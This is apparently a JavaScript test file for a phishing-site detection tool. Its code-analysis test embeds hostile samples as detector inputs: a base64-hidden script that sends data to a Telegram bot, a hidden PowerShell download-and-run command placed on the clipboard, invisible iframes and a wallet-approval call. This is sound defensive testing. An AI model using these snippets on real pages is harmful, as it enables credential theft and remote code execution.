import assert from 'node:assert/strict';
import { Readable } from 'node:stream';
import { test } from 'node:test';
import zlib from 'node:zlib';
import { analyzeCode, unpack } from '../lib/analyzer.js';
import { describeContact, emailInfo, phoneInfo } from '../lib/contacts.js';
import { investigate } from '../lib/index.js';
import { gunzipStream, lineBatches, unzipFirst } from '../lib/radar/bulk.js';
import { checkSite, nextInterval } from '../lib/radar/checker.js';
import { detectCohorts, markCohorts } from '../lib/radar/cohorts.js';
import { certificateNames, tileNames, tilePath } from '../lib/radar/ct.js';
import { promote, tick, watch } from '../lib/radar/daemon.js';
import { RadarStore, SRC } from '../lib/radar/store.js';
import { looksRandom, nameScore, shapeOf } from '../lib/radar/triage.js';
import { overview, radarMap, siteReport } from '../lib/radar/view.js';
import { takedownPage } from '../lib/visit.js';
import { dnsRoute, fakeNet, reply } from './helpers.js';

const memory = () => RadarStore.open(':memory:');
const b64 = (text) => Buffer.from(text).toString('base64');

test('names are triaged from spelling alone', () => {
  assert.equal(nameScore('google.com'), 0);
  assert.equal(nameScore('smallbakery.com'), 0);
  assert.equal(nameScore('paypal.com'), 0, 'the real brand is not a look-alike of itself');
  assert.ok(nameScore('paypal-account-verify.xyz') >= 55);
  assert.ok(nameScore('jncb-secure-login.top') >= 55);
  assert.ok(
    nameScore('mlqla.buzz') > 0 && nameScore('mlqla.buzz') < 55,
    'a random name alone is not enough to visit',
  );
  assert.deepEqual(nameScore('whatsapp-gift.buzz', true).reasons.slice(0, 2), [
    'borrows a brand name',
    'bait words (whatsapp, gift)',
  ]);
  assert.equal(looksRandom('obtnq'), true);
  assert.equal(looksRandom('bakery'), false);
  assert.equal(shapeOf('mlqla.buzz'), 'letters5.buzz');
  assert.equal(shapeOf('a1b2c3d4.top'), 'alnum8.top');
  assert.equal(shapeOf('nodot'), null);
});

// A stand-in certificate body: filler, then the subjectAltName extension holding the names
const fakeCertificate = (names) => {
  const entries = Buffer.concat(
    names.map((name) => Buffer.concat([Buffer.from([0x82, name.length]), Buffer.from(name)])),
  );
  const sequence = Buffer.concat([Buffer.from([0x30, entries.length]), entries]);
  return Buffer.concat([
    Buffer.from('filler-before'),
    Buffer.from([0x06, 0x03, 0x55, 0x1d, 0x11, 0x04, sequence.length]),
    sequence,
    Buffer.from('filler-after'),
  ]);
};

const fakeTile = (certificates) =>
  Buffer.concat(
    certificates.map(({ names, precert }) => {
      const der = fakeCertificate(names);
      const size = Buffer.alloc(3);
      size.writeUIntBE(der.length, 0, 3);
      const parts = [Buffer.alloc(8), Buffer.from([0, precert ? 1 : 0])];
      if (precert) parts.push(Buffer.alloc(32));
      parts.push(size, der, Buffer.from([0, 0]));
      if (precert) parts.push(Buffer.from([0, 0, 2, 9, 9]));
      parts.push(Buffer.from([0, 0]));
      return Buffer.concat(parts);
    }),
  );

test('hostnames are read straight out of certificate-log tiles', () => {
  assert.deepEqual(certificateNames(fakeCertificate(['a.example', '*.B.example'])), [
    'a.example',
    '*.b.example',
  ]);
  assert.deepEqual(certificateNames(Buffer.from('no extension here')), []);
  const tile = fakeTile([
    { names: ['one.example'] },
    { names: ['two.example', 'www.two.example'], precert: true },
    { names: ['three.example'] },
  ]);
  assert.deepEqual(tileNames(tile), [
    'one.example',
    'two.example',
    'www.two.example',
    'three.example',
  ]);
  assert.equal(tilePath(67), '067');
  assert.equal(tilePath(1234067), 'x001/x234/067');
});

test('big downloads are read in pieces, and a zip gives up its first file', async () => {
  const lines = [];
  for await (const batch of lineBatches(
    Readable.from([Buffer.from('a.example\nb.exa'), Buffer.from('mple\nc.example')]),
  ))
    lines.push(...batch);
  assert.deepEqual(lines, ['a.example', 'b.example', 'c.example']);

  // A download cut off mid-stream ends quietly instead of throwing
  const whole = zlib.gzipSync(Buffer.from(`${'line of text\n'.repeat(5000)}`));
  let text = '';
  for await (const chunk of gunzipStream(Readable.from([whole.subarray(0, whole.length - 20)])))
    text += chunk;
  assert.ok(text.startsWith('line of text\n'));

  const content = Buffer.from('1,google.com\n2,example.org\n');
  const packed = zlib.deflateRawSync(content);
  const name = Buffer.from('top.csv');
  const local = Buffer.alloc(30);
  local.writeUInt32LE(0x04034b50, 0);
  local.writeUInt16LE(8, 8);
  local.writeUInt16LE(name.length, 26);
  const central = Buffer.alloc(46);
  central.writeUInt32LE(0x02014b50, 0);
  central.writeUInt16LE(8, 10);
  central.writeUInt32LE(packed.length, 20);
  central.writeUInt32LE(content.length, 24);
  central.writeUInt16LE(name.length, 28);
  central.writeUInt32LE(0, 42);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt32LE(30 + name.length + packed.length, 16);
  assert.equal(
    unzipFirst(Buffer.concat([local, name, packed, central, name, end])).toString(),
    content.toString(),
  );
  assert.throws(() => unzipFirst(Buffer.from('not a zip at all, just text')), /Not a zip/);
});

test('the index merges what each source knows about a name', async () => {
  const store = await memory();
  store.upsertDomains([
    { name: 'established.example', src: SRC.RANKED, rank: 500, ns: 0 },
    { name: 'fresh-bad.example', src: SRC.NRD, ns: 18 },
  ]);
  store.upsertDomains([
    { name: 'fresh-bad.example', src: SRC.PHISHING, ns: 18 },
    { name: 'established.example', src: SRC.TOPLIST, top: 90 },
  ]);
  const bad = store.getDomain('fresh-bad.example');
  assert.equal(bad.src, SRC.NRD | SRC.PHISHING);
  assert.ok(bad.score >= 80, 'a new, blocklisted name is worth visiting');
  const good = store.getDomain('established.example');
  assert.equal(good.rank, 500);
  assert.equal(good.top, 90);
  assert.equal(good.score, 0, 'a popular site is not, whatever else is known');
  assert.deepEqual(
    store.candidates(10).map((row) => row.name),
    ['fresh-bad.example'],
  );
  assert.equal(store.stats({ refresh: true }).domains, 2);
  store.close();
});

test('bulk-registration batches stand out against the established web', async () => {
  const store = await memory();
  const shapes = new Map([
    ['letters8.com', { base: 400000, fresh: 9000, random: 2500 }],
    ['letters5.buzz', { base: 20, fresh: 600, random: 380 }],
    ['letters9.shop', { base: 900, fresh: 3000, random: 300 }],
    ['hyphenated18.xyz', { base: 2, fresh: 400, random: 390 }],
  ]);
  store.bumpShapes(shapes);
  const cohorts = detectCohorts(store);
  assert.deepEqual(
    cohorts.map((cohort) => cohort.shape),
    ['letters5.buzz'],
    'only the short, mostly-random, over-represented mould',
  );
  assert.ok(cohorts[0].lift > 50);

  const batch = ['mlqla.buzz', 'obtnq.buzz', 'rymjq.buzz', 'gezun.buzz'];
  store.upsertDomains([
    ...batch.map((name) => ({ name, src: SRC.NRD, ns: nameScore(name) })),
    { name: 'bakery.buzz', src: SRC.RANKED, rank: 9 },
  ]);
  assert.equal(store.candidates(10).length, 0, 'none of them is suspicious enough by name');
  const marked = markCohorts(store, cohorts);
  assert.equal(marked[0].members, 4);
  assert.deepEqual(
    store
      .candidates(10)
      .map((row) => row.name)
      .sort(),
    batch.slice().sort(),
    'but as a batch they all are',
  );
  assert.equal(
    store.getDomain('bakery.buzz').src & SRC.COHORT,
    0,
    'an established name of the same shape is left alone',
  );
  store.close();
});

const stub = '404codeaaag';
const lure = (title) =>
  `<html><head><title>${title}</title><meta property="og:image" content="/metaconfig/images/en/01.jpg"><meta property="og:url" content="https://www.whatsapp.com/"></head><body><a href="mailto:Claims.Desk@gift-office.example">write</a> or WhatsApp +1 876 555 0142</body></html>`;

// A kit site that answers its front door with the stub and any other path with its lure
const kitWorld = (state) => [
  dnsRoute(
    new Proxy(
      {},
      { get: (unused, name) => (state.dns[name] === undefined ? undefined : state.dns[name]) },
    ),
  ),
  (url) => {
    const { hostname, pathname } = new URL(url);
    if (!state.up[hostname]) return undefined;
    if (pathname === '/') return reply(stub, { headers: { 'content-type': 'text/plain' } });
    return reply(lure(state.title));
  },
];

test('a watched site is tracked through a lure change, a takedown and a comeback', async () => {
  const store = await memory();
  const state = {
    dns: { 'kit.example': { A: ['203.0.113.50'], NS: [] } },
    up: { 'kit.example': true },
    title: '🇯🇲Acme - Independence Day Gift!🎁',
  };
  const { ctx } = fakeNet(kitWorld(state));
  watch(store, ['kit.example']);
  const visit = async () => {
    const result = await checkSite(ctx, store, store.getSite('kit.example'));
    store.saveSite(result.site);
    return result;
  };

  let { site, events } = await visit();
  assert.equal(site.state, 'live');
  assert.equal(site.kit, 'whatsapp-brand-gift', 'recognised from the front-door stub');
  assert.equal(site.title, state.title, 'and its lure read from a made-up path');
  assert.equal(site.level, 'critical');
  assert.equal(site.category, 'giveaway');
  assert.deepEqual(
    site.detail.targets.map((target) => target.country),
    ['JM'],
  );
  assert.deepEqual(site.detail.contacts.map((contact) => `${contact.kind}:${contact.id}`).sort(), [
    'email:claims.desk@gift-office.example',
    'phone:+18765550142',
  ]);
  assert.deepEqual(
    events.map((event) => event.type),
    ['first-visit'],
  );

  state.title = '🇵🇭Acme - Bonifacio Day Gift!🎁';
  ({ site, events } = await visit());
  assert.deepEqual(
    events.map((event) => event.type),
    ['title'],
  );
  assert.equal(site.changes, 1);

  // It vanishes from DNS: one miss is not yet a takedown
  state.dns['kit.example'] = {};
  ({ site, events } = await visit());
  assert.equal(site.state, 'offline');
  assert.equal(site.taken_down, null);
  assert.equal(events.length, 0);
  assert.equal(site.level, 'critical', 'a site that has gone dark keeps the verdict it earned');
  ({ site, events } = await visit());
  assert.deepEqual(
    events.map((event) => event.type),
    ['taken-down'],
  );
  assert.equal(site.taken_down, site.down_since);
  assert.ok(events[0].detail.lastSeenUp <= events[0].detail.firstSeenDown);
  assert.equal(site.ups, 2);
  assert.equal(site.checks, 4);

  state.dns['kit.example'] = { A: ['203.0.113.50'], NS: [] };
  ({ site, events } = await visit());
  assert.deepEqual(
    events.map((event) => event.type),
    ['back'],
  );
  assert.equal(site.taken_down, null);
  assert.equal(site.state, 'live');
  store.close();
});

test('our own failures are never recorded as a site going down', async () => {
  const store = await memory();
  watch(store, ['kit.example']);
  const { ctx } = fakeNet([() => reply('upstream trouble', { status: 502 })]);
  const { site, events } = await checkSite(ctx, store, store.getSite('kit.example'));
  assert.equal(site.state, 'pending');
  assert.equal(site.checks, 0);
  assert.equal(events.length, 0);
  store.close();
});

test('checks come round sooner for risky live sites and back off for dead ones', () => {
  const now = Math.floor(Date.now() / 1000);
  const live = nextInterval({
    state: 'live',
    level: 'critical',
    first_seen: now - 10 * 86400,
    fails: 0,
  });
  const calm = nextInterval({
    state: 'live',
    level: 'low',
    first_seen: now - 10 * 86400,
    fails: 0,
  });
  const justDown = nextInterval({ state: 'offline', fails: 1, down_since: now });
  const longDown = nextInterval({ state: 'offline', fails: 7, down_since: now - 3600 });
  assert.ok(live < calm);
  assert.ok(justDown < longDown);
  assert.ok(justDown <= 45 * 60);
});

test('a scan cycle promotes, visits and records, and the views read it back', async () => {
  const store = await memory();
  const state = {
    dns: {
      'kit.example': {
        A: ['203.0.113.50'],
        NS: ['ada.ns.cloudflare.com.', 'bob.ns.cloudflare.com.'],
      },
      'kit-two.example': { A: ['203.0.113.51'], NS: [] },
      'dead-phish.example': {},
    },
    up: { 'kit.example': true, 'kit-two.example': true },
    title: '🇯🇲Acme - Independence Day Gift!🎁',
  };
  const { ctx } = fakeNet(kitWorld(state));
  store.upsertDomains([
    { name: 'kit.example', src: SRC.URLFEED | SRC.PHISHING, ns: 10 },
    { name: 'kit-two.example', src: SRC.SCAM, ns: 10 },
    { name: 'dead-phish.example', src: SRC.PHISHING, ns: 0 },
    { name: 'popular.example', src: SRC.RANKED | SRC.PHISHING, rank: 10, top: 10 },
  ]);
  assert.equal(promote(store, { limit: 0 }), 0);
  const report = await tick(store, { ctx, ct: false, feedsEvery: 0, cohortsEvery: 0, seconds: 30 });
  assert.equal(report.promoted, 3, 'the popular site stays off the watchlist');
  assert.equal(report.checks.checked, 3);
  assert.equal(report.checks.live, 2);
  assert.equal(store.getMeta('ticks'), 1);

  const status = overview(store, { refresh: true });
  assert.equal(status.indexed.domains, 4);
  assert.equal(status.watched.live, 2);
  assert.equal(status.watched.runningAKnownKit, 2);

  const report2 = siteReport(store, 'kit.example');
  assert.equal(report2.risk.level, 'critical');
  assert.equal(report2.lifespan.uptime, 100);
  assert.ok(report2.events.some((event) => event.type === 'first-visit'));
  assert.ok(
    report2.sharedWith.some(
      (group) => group.kind === 'email' && group.sites.includes('kit-two.example'),
    ),
    'the two kit sites publish the same contact',
  );
  assert.equal(siteReport(store, 'unknown.example'), null);
  assert.equal(siteReport(store, 'popular.example').watched, false);

  const map = radarMap(store);
  assert.equal(map.kind, 'radar');
  assert.deepEqual(map.domains.map((domain) => domain.domain).sort(), [
    'dead-phish.example',
    'kit-two.example',
    'kit.example',
  ]);
  assert.equal(map.campaigns[0].size, 2);
  assert.ok(map.domains.every((domain) => domain.track && domain.risk.signals));
  assert.ok(map.links.some((link) => link.kind === 'contact' && link.domains.length === 2));

  // An investigation of one kit site picks up the other from Radar without re-fetching it
  const result = await investigate('https://kit.example/AbCdEf/x?s=wa', {
    ctx,
    radar: store,
    feeds: 'none',
    pages: 0,
    rdap: 0,
  });
  const sibling = result.domains.find((domain) => domain.domain === 'kit-two.example');
  assert.equal(sibling.state, 'live');
  assert.equal(sibling.kits[0].id, 'whatsapp-brand-gift');
  assert.equal(sibling.campaign, result.domains[0].campaign);
  store.close();
});

test('code analysis reads through encoding layers', () => {
  const hiddenBot = `<input type="password"><script>eval(atob("${b64('fetch("https://api.telegram.org/bot1234567890:AAH-abcdefghijklmnopqrstuvwxyz012345/sendMessage")')}"))</script>`;
  const found = analyzeCode({ html: hiddenBot, host: 'x.example', forms: { passwordFields: 1 } });
  assert.equal(found.layers, 1);
  const bot = found.findings.find((finding) => finding.id === 'exfil-telegram');
  assert.equal(bot.hidden, true);
  assert.equal(bot.severity, 3);
  assert.doesNotMatch(bot.evidence, /AAH-abc/, 'the bot token itself is never kept');
  assert.ok(found.findings.some((finding) => finding.id === 'run-hidden-code'));

  const codes = [...'<iframe src="https://bad.example" width="0" height="0"></iframe>']
    .map((char) => char.charCodeAt(0))
    .join(',');
  assert.ok(
    analyzeCode({
      html: `<script>document.write(String.fromCharCode(${codes}))</script>`,
    }).findings.some((finding) => finding.id === 'hidden-frame' && finding.hidden),
  );
  assert.equal(
    unpack(`var a = "${'\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f'}";`).hidden,
    'https://',
  );

  const ids = (html, extra = {}) =>
    analyzeCode({ html, host: 'x.example', ...extra }).findings.map((finding) => finding.id);
  assert.ok(
    ids(
      '<button onclick="navigator.clipboard.writeText(c)">I am human</button><script>var c = "powershell -w hidden -c iex(irm https://x.example/a)"</script>',
    ).includes('clipboard-command'),
  );
  assert.ok(
    ids(
      '<script src="web3modal.js"></script><script>contract.setApprovalForAll(spender, true)</script>',
    ).includes('wallet-approval'),
  );
  assert.ok(
    ids('<textarea placeholder="Enter your 12 word recovery phrase"></textarea>').includes(
      'seed-phrase',
    ),
  );
  assert.ok(
    ids('<img src="https://www.paypal.com/logo.png">', {
      externalHosts: ['www.paypal.com'],
    }).includes('brand-assets'),
  );
  assert.ok(
    ids('<script src="https://evil.example/a.js"></script>', {
      isListed: (host) => host === 'evil.example',
    }).includes('listed-script'),
  );
  assert.ok(
    ids('', {
      text: 'VIP 1 VIP 2. Recharge now for daily income. Invite bonus 10%. Withdrawal record. Grab orders in the task hall.',
    }).includes('investment-pitch'),
  );
  // The tag-manager snippet on half the web uses a hidden frame, and is not a finding
  assert.deepEqual(
    ids(
      '<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-ABCDE" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>',
    ),
    [],
  );
  assert.ok(
    ids(
      '<iframe src="https://collector.bad-host.example/x" width="0" height="0"></iframe>',
    ).includes('hidden-frame'),
  );
  assert.deepEqual(
    ids(
      '<html><head><title>Bakery</title><script src="/js/app.js"></script></head><body><form action="/search"><input name="q"></form></body></html>',
    ),
    [],
  );
});

test('takedown and parking pages are told apart from live sites', () => {
  assert.equal(
    takedownPage({ title: 'Suspected Phishing Site | Cloudflare', text: '' }).kind,
    'blocked',
  );
  assert.equal(
    takedownPage({ title: 'Account Suspended', text: 'This Account has been suspended.' }).kind,
    'suspended',
  );
  assert.equal(
    takedownPage({ title: 'Notice', text: 'This domain has been seized by the FBI' }).kind,
    'seized',
  );
  assert.equal(
    takedownPage({ title: 'example.com', text: 'This domain is for sale. Buy this domain today.' })
      .kind,
    'parked',
  );
  assert.equal(takedownPage({ title: 'Fresh bread daily', text: 'Opening hours' }), null);
  assert.equal(takedownPage(null), null);
});

test('a contact point is described without identifying anyone', async () => {
  const jamaica = phoneInfo('+1 (876) 555-0142');
  assert.equal(jamaica.country, 'JM');
  assert.match(jamaica.notes[0], /876/);
  assert.equal(phoneInfo('+44 20 7946 0958').country, 'GB');
  assert.equal(phoneInfo('+1 416 555 0100').country, 'CA');
  assert.equal(phoneInfo('+1 212 555 0100').country, 'US');
  assert.equal(phoneInfo('12345'), null);
  assert.equal(emailInfo('Agent@Gmail.com').provider, 'free-webmail');
  assert.equal(emailInfo('x@mailinator.com').provider, 'throwaway');
  assert.equal(emailInfo('claims@prize-office.example').provider, 'own-domain');
  assert.equal(emailInfo('not an email'), null);

  const offline = await describeContact(null, 'claims@prize-office.example');
  assert.equal(offline.kind, 'email');
  assert.equal(offline.spamReports, undefined, 'nothing is looked up unless asked');
  assert.match(offline.caveat, /not as the identity of a person/);
  const phone = await describeContact(null, '+18765550142');
  assert.match(phone.breachExposure.skipped, /not attempted/);
  assert.equal(await describeContact(null, 'hello'), null);
});
